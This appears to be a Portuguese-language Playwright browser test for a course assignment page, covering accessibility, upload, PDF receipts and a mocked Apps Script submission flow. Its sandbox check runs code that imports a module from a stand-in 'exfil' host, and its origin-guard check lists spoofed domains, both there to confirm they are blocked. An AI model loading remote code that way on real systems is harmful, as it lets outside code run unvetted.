/* Chromium real + Apps Script da candidata em VM. Nenhum POST sai para Google. */
'use strict';
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');
const http = require('node:http');
const crypto = require('node:crypto');
const { pathToFileURL } = require('node:url');
const { chromium } = require('playwright');
const { createFixture } = require('./mobile-entregas-aula08.test.cjs');
const root = path.resolve(__dirname, '..');
const lesson = path.join(root, 'lessons/aula-08-av1-incremento-1');
const endpoint = 'https://script.google.com/macros/s/AKfycbyrvOlCl0Icm98SRNJ3SJy4gjx4Q4GH_k0EhxV50ebe93JXj_zjE8MmJ_zoGMwvNtXR/exec';
const childOrigin = 'https://n-a08-qa-0lu-script.googleusercontent.com';
const hash = bytes => crypto.createHash('sha256').update(bytes).digest('hex');
const output = process.env.AULA08_EVIDENCE_DIR || fs.mkdtempSync(path.join(os.tmpdir(), 'a08-browser-'));
fs.mkdirSync(output, { recursive: true });
const passed = [], pageErrors = [], external = [];
const record = name => { passed.push(name); console.log('PASS', name); };
function serve() {
  const mime = { '.html': 'text/html', '.js': 'text/javascript', '.mjs': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.png': 'image/png' };
  return http.createServer((req, res) => {
    let relative; try { relative = decodeURIComponent(req.url.split('?')[0]); } catch { res.writeHead(400); res.end(); return; }
    let target = path.resolve(root, '.' + relative);
    if (!target.startsWith(root + path.sep)) { res.writeHead(403); res.end(); return; }
    if (fs.existsSync(target) && fs.statSync(target).isDirectory()) target = path.join(target, 'index.html');
    if (!fs.existsSync(target)) { res.writeHead(404); res.end('Ausente'); return; }
    res.writeHead(200, { 'Content-Type': (mime[path.extname(target)] || 'text/plain') + '; charset=utf-8' });
    res.end(fs.readFileSync(target));
  });
}
(async () => {
  const { generatePackage } = await import(pathToFileURL(path.join(lesson, 'projeto/scripts/gerar-entrega.mjs')));
  const text = await generatePackage(path.join(lesson, 'projeto'));
  const buffer = Buffer.from(text);
  const srv = serve(); await new Promise(resolve => srv.listen(0, '127.0.0.1', resolve));
  const address = `http://127.0.0.1:${srv.address().port}`;
  const base = address + '/lessons/aula-08-av1-incremento-1/';
  const launch = { headless: true };
  if (process.env.PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH) {
    launch.executablePath = process.env.PLAYWRIGHT_CHROMIUM_EXECUTABLE_PATH;
    launch.args = ['--no-sandbox', '--disable-dev-shm-usage'];
  }
  const browser = await chromium.launch(launch), context = await browser.newContext({ acceptDownloads: true, viewport: { width: 375, height: 812 } });
  const page = await context.newPage(); page.on('pageerror', error => pageErrors.push(error.message));
  let fixture = createFixture(), mode = 'ok', postCount = 0, finalPayload, lastReceipt, responses = new Map(), responseId = 0;
  const scriptHtml = obj => '<!doctype html><meta charset="utf-8"><script>top.postMessage(' + JSON.stringify(obj).replace(/</g, '\\u003c') + ',"*");</scr' + 'ipt>';
  await context.route('**/*', async route => {
    const url = route.request().url();
    if (url.startsWith(address + '/')) return route.continue();
    if (url.startsWith(childOrigin + '/reply/')) {
      const item = responses.get(url);
      return route.fulfill({ status: 200, contentType: 'text/html', body: scriptHtml(item) });
    }
    if (url !== endpoint) { external.push(url); return route.abort(); }
    postCount++;
    assert.equal(route.request().method(), 'POST');
    const form = new URLSearchParams(route.request().postData() || ''), payload = JSON.parse(form.get('payload'));
    if (mode === 'timeout') return route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><title>Sem resposta simulada</title>' });
    let result = fixture.post(payload, form.get('nonce'));
    if (payload.action === 'verifyAndSubmit') { finalPayload = payload; lastReceipt = result.receipt; }
    if (mode === 'bad-receipt' && payload.action === 'verifyAndSubmit' && result.receipt) result.receipt.members[0].total += 0.5;
    if (mode === 'reject' && payload.action === 'verifyAndSubmit') result = { channel: 'mobile-aula08-receipt', requestNonce: form.get('nonce'), ok: false, error: 'Falha simulada de gravação.' };
    if (mode === 'wrong-nonce') result.requestNonce = 'nonce-incorreto';
    if (mode === 'nested') {
      const target = childOrigin + '/reply/' + (++responseId); responses.set(target, result);
      return route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><iframe src="' + target + '"></iframe>' });
    }
    return route.fulfill({ status: 200, contentType: 'text/html', body: scriptHtml(result) });
  });
  const upload = async () => {
    await page.locator('#package-file').setInputFiles({ name: 'entrega-a08.jsonl', mimeType: 'application/x-ndjson', buffer });
    await page.waitForFunction(() => document.getElementById('import-status').textContent.includes('Pacote válido'));
  };
  const identify = async () => {
    await page.locator('#team').fill('Equipe QA');
    for (const [i, name] of ['QA Ana', 'QA Bia', 'QA Caio', 'QA Dora'].entries()) await page.locator(`#member-${i + 1}`).fill(name);
  };
  const waitResult = async confirmed => {
    await page.waitForFunction(confirmed => document.getElementById('delivery-status').textContent.includes(confirmed ? 'ENTREGA CONFIRMADA' : 'ENTREGA NÃO CONFIRMADA'), confirmed, { timeout: 30000 });
  };
  const submitPdf = async filename => {
    const download = await Promise.all([page.waitForEvent('download', { timeout: 30000 }), page.locator('#submit-delivery').click()]).then(x => x[0]);
    const target = path.join(output, filename); await download.saveAs(target); return target;
  };
  try {
    await page.goto(base + 'index.html'); await page.waitForLoadState('networkidle');
    assert.match(await page.title(), /Aula 08/);
    assert.equal(await page.locator('.milestone').count(), 4);
    await page.keyboard.press('Tab'); assert.equal(await page.locator(':focus').getAttribute('class'), 'skip-link');
    await page.keyboard.press('Enter'); assert.equal(await page.locator(':focus').getAttribute('id'), 'conteudo');
    assert.ok((await page.locator('[data-required-image] img').getAttribute('alt')).length > 30);
    assert.match(await page.locator('.equivalent').innerText(), /Marco 2/);
    record('Aula, quatro marcos, skip link, teclado e descrição textual dos infográficos');
    const missingImages = ['infografico-marcos-av1.png', 'fluxo-aluno-laboratorio-vivo.png'].filter(name => !fs.existsSync(path.join(lesson, 'assets', name)));
    console.log(missingImages.length ? 'BLOCKED G1: infográficos originais ausentes: ' + missingImages.join(', ') : 'PASS G1 assets presentes');
    await page.screenshot({ path: path.join(output, 'aula08-375.png'), fullPage: true });
    for (const pageName of ['index.html', 'atividade.html']) {
      await page.goto(base + pageName); await page.waitForLoadState('networkidle');
      for (const width of [320, 375, 768, 1024, 1440]) for (const height of [812, 375]) {
        await page.setViewportSize({ width, height });
        const size = await page.evaluate(() => ({ scroll: document.documentElement.scrollWidth, inner: innerWidth }));
        assert.ok(size.scroll <= size.inner + 1, `${pageName} overflow ${width}x${height}`);
      }
      await page.addScriptTag({ path: require.resolve('axe-core/axe.min.js') });
      const violations = await page.evaluate(async () => (await axe.run(document, { runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21aa', 'wcag22aa'] } })).violations.map(v => ({ id: v.id, targets: v.nodes.map(n => n.target) })));
      assert.deepEqual(violations, []);
    }
    record('Duas páginas em 320/375/768/1024/1440, retrato/paisagem e axe WCAG 2.2 AA');
    await page.setViewportSize({ width: 375, height: 812 });
    await page.goto(base + 'atividade.html'); await upload(); await identify();
    assert.equal(await page.locator('#submit-delivery').isEnabled(), true);
    assert.match(await page.locator('#local-score').innerText(), /não define/);
    const firstPdf = await submitPdf('aula08-entrega.pdf'); await waitResult(true);
    assert.equal(fs.readFileSync(firstPdf).subarray(0, 8).toString(), '%PDF-1.4');
    assert.equal(hash(fs.readFileSync(firstPdf)), finalPayload.pdfSha256);
    assert.equal(lastReceipt.pdfSha256, finalPayload.pdfSha256);
    assert.equal(lastReceipt.members.length, 4);
    assert.ok(new Set(lastReceipt.members.map(m => m.total)).size > 1, 'Notas reais do starter por integrante');
    assert.equal(fixture.audit().length, 5); assert.equal(fixture.grade().length, 5);
    assert.ok(finalPayload.outputs.every(o => typeof o.ok === 'boolean'));
    assert.equal(await page.locator('#progress-log li').count(), 8);
    await page.screenshot({ path: path.join(output, 'ficha08-recibo-375.png'), fullPage: true });
    record('JSONL real → sandbox → servidor VM → notas individuais → bytes PDF/hash → recibo HMAC');
    const again = await Promise.all([page.waitForEvent('download'), page.locator('#save-pdf-again').click()]).then(x => x[0]);
    const againPath = path.join(output, 'mesmo-pdf.pdf'); await again.saveAs(againPath);
    assert.equal(hash(fs.readFileSync(againPath)), finalPayload.pdfSha256);
    record('Download posterior preserva exatamente o PDF vinculado ao recibo');
    await page.locator('#team').fill('Equipe QA alterada');
    assert.equal(await page.locator('#receipt-panel').isVisible(), false);
    assert.ok(!(await page.locator('#delivery-status').innerText()).includes('ENTREGA CONFIRMADA'));
    await page.locator('#team').fill('Equipe QA');
    mode = 'nested';
    await submitPdf('aula08-reenvio.pdf'); await waitResult(true);
    assert.equal(fixture.grade().length, 5); assert.equal(fixture.audit().length, 5);
    record('Mudança de identidade limpa confirmação; reenvio por iframe Google aninhado sem duplicatas');
    fixture = createFixture(); mode = 'bad-receipt';
    await submitPdf('recibo-adulterado.pdf'); await waitResult(false);
    assert.equal(await page.locator('#receipt-panel').isVisible(), false);
    record('Nota adulterada no recibo não confirma entrega');
    fixture = createFixture(); mode = 'reject';
    await submitPdf('recusado.pdf'); await waitResult(false);
    record('Erro de gravação não confirma, mantendo PDF local');
    mode = 'ok';
    await page.locator('#package-file').setInputFiles({ name: 'entrega-a08.jsonl', mimeType: 'application/x-ndjson', buffer: Buffer.from('{"type":"unknown"}\n') });
    await page.waitForFunction(() => document.getElementById('import-status').textContent.includes('inválido'));
    assert.equal(await page.locator('#submit-delivery').isDisabled(), true);
    record('JSONL inválido recusa importação e bloqueia envio');
    const dataTransfer = await page.evaluateHandle(text => { const d = new DataTransfer(); d.items.add(new File([text], 'entrega-a08.jsonl', { type: 'application/x-ndjson' })); return d; }, text);
    await page.locator('#drop-zone').dispatchEvent('drop', { dataTransfer });
    await page.waitForFunction(() => document.getElementById('import-status').textContent.includes('Pacote válido'));
    await dataTransfer.dispose();
    record('Arrastar e soltar usa o mesmo parser estrito');
    const beforeOffline = postCount;
    await context.setOffline(true);
    const offline = await Promise.all([page.waitForEvent('download'), page.locator('#local-pdf').click()]).then(x => x[0]);
    await offline.saveAs(path.join(output, 'offline.pdf'));
    assert.equal(postCount, beforeOffline); assert.ok(!(await page.locator('#delivery-status').innerText()).includes('ENTREGA CONFIRMADA'));
    await context.setOffline(false);
    record('PDF local funciona offline sem POST nem falsa confirmação');
    const sandbox = await page.evaluate(async () => {
      const { runChallenge } = await import('./verificador.js');
      const c = [{ id: 'probe', scope: 'team', input: { value: 1 } }];
      const source = code => [{ path: 'src/equipe.mjs', code }];
      const result = await runChallenge(source('export function resolver(){return {dom:typeof document,storage:typeof indexedDB,network:typeof fetch}}'), c);
      const infinite = await runChallenge(source('export function resolver(){while(true){}}'), c, { caseTimeoutMs: 150 });
      const remote = await runChallenge(source('export async function resolver(){await import("https://example.invalid/exfil.mjs");return 1}'), c);
      return { result, infinite, remote, frames: document.querySelectorAll('iframe[sandbox]').length };
    });
    assert.deepEqual(sandbox.result[0].value, { dom: 'undefined', storage: 'undefined', network: 'undefined' });
    assert.equal(sandbox.infinite[0].error, 'TIMEOUT'); assert.equal(sandbox.remote[0].ok, false); assert.equal(sandbox.frames, 0);
    record('Sandbox sem DOM/rede/armazenamento, import externo recusado e laço encerrado');
    for (const failedMode of ['timeout', 'wrong-nonce']) {
      mode = failedMode;
      const outcome = await page.evaluate(async () => {
        const { request } = await import('./entrega-appscript.js');
        try { await request('validateReceipt', { receipt: {} }, { timeoutMs: 250 }); return 'BAD'; }
        catch (error) { return error.message; }
      });
      assert.match(outcome, /não respondeu/);
    }
    mode = 'ok';
    const guards = await page.evaluate(async () => {
      const { request, isGoogleOrigin } = await import('./entrega-appscript.js');
      let error; try { await request('challenge', {}, { endpoint: 'https://script.google.com/macros/s/PPI/exec' }); } catch (e) { error = e.message; }
      return { error, origins: ['https://evil.example','https://googleusercontent.com','https://script.google.com.evil.example'].map(isGoogleOrigin) };
    });
    assert.match(guards.error, /não autorizado/); assert.deepEqual(guards.origins, [false, false, false]);
    record('Timeout e nonce incorreto ignorados; endpoint PPI e origens alheias recusados');
    assert.deepEqual(pageErrors, []); assert.deepEqual(external, []);
    record('Nenhum erro JavaScript de página; nenhum pedido externo escapou ao mock');
    fs.writeFileSync(path.join(output, 'results.json'), JSON.stringify({ browser: browser.version(), passed, missingImages, pageErrors, external, liveE2E: 'PENDING_LIVE_E2E' }, null, 2));
    console.log(`BROWSER A08: ${passed.length}/${passed.length} PASS; G1 separado; evidências: ${output}`);
  } finally { await browser.close(); await new Promise(resolve => srv.close(resolve)); }
})().catch(error => { console.error(error); process.exitCode = 1; });
